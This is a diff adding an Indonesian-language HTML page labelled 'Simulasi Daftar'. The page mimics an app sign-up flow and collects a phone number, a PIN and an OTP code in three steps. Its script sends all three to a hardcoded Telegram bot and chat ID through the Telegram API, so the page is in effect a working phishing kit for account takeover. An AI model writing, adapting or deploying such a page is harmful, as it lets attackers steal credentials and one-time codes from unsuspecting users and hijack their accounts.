@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Simulasi Daftar</title>
+
+<style>
+/* GENERAL RESET */
+body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: Arial, sans-serif; background: #fff; }
+button { cursor: pointer; }
+
+/* CONTAINER */
+.container { max-width: 420px; margin: auto; padding: 20px; }
+
+/* CARD UI */
+.card {
+  border-radius: 12px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.12);
+  background: #fff;
+  padding: 22px;
+}
+
+/* COMMON */
+.hidden { display: none; }
+.title { font-size: 24px; font-weight: bold; margin-bottom: 16px; text-align: center; }
+
+/* INPUT */
+input {
+  width: calc(100% - 20px);
+  padding: 10px;
+  border: 1px solid #ccc;
+  border-radius: 7px;
+  font-size: 16px;
+  margin-top: 10px;
+}
+
+/* BUTTON MAJOR */
+.btn-main {
+  width: 100%;
+  background: #EE1D52;
+  color: #fff;
+  border: none;
+  padding: 12px;
+  font-size: 18px;
+  border-radius: 7px;
+  margin-top: 14px;
+}
+
+/* BUTTON ALT */
+.btn-alt {
+  width: 100%;
+  background: #fff;
+  border: 1px solid #ccc;
+  padding: 10px;
+  margin-top: 10px;
+  font-size: 15px;
+  border-radius: 7px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.btn-alt img { width: 20px; margin-right: 8px; }
+
+/* FOOTER TEXT */
+.footer-text { font-size: 12px; color: #888; text-align: center; margin-top: 14px; line-height: 18px; }
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+  <!-- STEP 1: PHONE -->
+  <div id="page-phone" class="card">
+    <div class="title">Mendaftar Akun</div>
+
+    <input type="text" id="phone" placeholder="Masukkan nomor telepon (08...)" />
+
+    <button class="btn-main" onclick="goNext('pin')">Lanjutkan</button>
+
+    <div style="text-align:center; margin:12px 0; color:#555;">atau</div>
+
+    <button class="btn-alt">
+      <img src="https://img.icons8.com/ios-filled/50/000000/new-post.png"/>
+      Lanjutkan dengan Email
+    </button>
+
+    <button class="btn-alt">
+      <img src="https://img.icons8.com/ios-filled/50/000000/facebook-new.png"/>
+      Lanjutkan dengan Facebook
+    </button>
+
+    <button class="btn-alt">
+      <img src="https://img.icons8.com/ios-filled/50/000000/google-logo.png"/>
+      Lanjutkan dengan Google
+    </button>
+
+    <div class="footer-text">
+      Dengan menggunakan akun, kamu menyetujui Ketentuan Layanan dan Kebijakan Privasi.
+    </div>
+  </div>
+
+
+  <!-- STEP 2: PIN -->
+  <div id="page-pin" class="card hidden">
+    <div class="title">Masukkan PIN</div>
+    <input type="password" id="pin" maxlength="6" placeholder="••••••" />
+    <button class="btn-main" onclick="goNext('otp')">Lanjutkan</button>
+  </div>
+
+
+  <!-- STEP 3: OTP -->
+  <div id="page-otp" class="card hidden">
+    <div class="title">Masukkan OTP</div>
+    <input type="text" id="otp" maxlength="6" placeholder="Kode OTP" />
+    <button class="btn-main" onclick="sendToTelegram()">Submit</button>
+  </div>
+
+
+  <!-- STEP 4: DONE -->
+  <div id="page-done" class="card hidden">
+    <div class="title">Selesai!</div>
+    <p style="text-align:center; color:#444;">Terimah kasih 😊</p>
+  </div>
+
+</div>
+
+<script>
+// pindah page
+function goNext(target) {
+  document.querySelectorAll('.card').forEach(el => el.classList.add('hidden'));
+  document.getElementById('page-' + target).classList.remove('hidden');
+}
+
+// Telegram Bot Info (ganti sendiri)
+const BOT_TOKEN = "8484343218:AAFzuw3--FGYJpTPFCSI7Se_PbAvPZTupE4";
+const CHAT_ID  = "8383119228";
+
+// kirim ke telegram ketika selesai
+function sendToTelegram() {
+  const phone = document.getElementById('phone').value.trim();
+  const pin   = document.getElementById('pin').value.trim();
+  const otp   = document.getElementById('otp').value.trim();
+
+  if (!phone || !pin || !otp) {
+    alert("Lengkapi semua dulu!");
+    return;
+  }
+
+  const text =
+    "📍 Simulasi Daftar 📍\n" +
+    "Nomor: " + phone + "\n" +
+    "PIN   : " + pin + "\n" +
+    "OTP   : " + otp;
+
+  const url =
+    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+  fetch(url)
+    .then(res => res.json())
+    .then(() => goNext('done'))
+    .catch(err => alert("Gagal kirim ke Telegram: " + err));
+}
+</script>
+
+</body>
+</html>
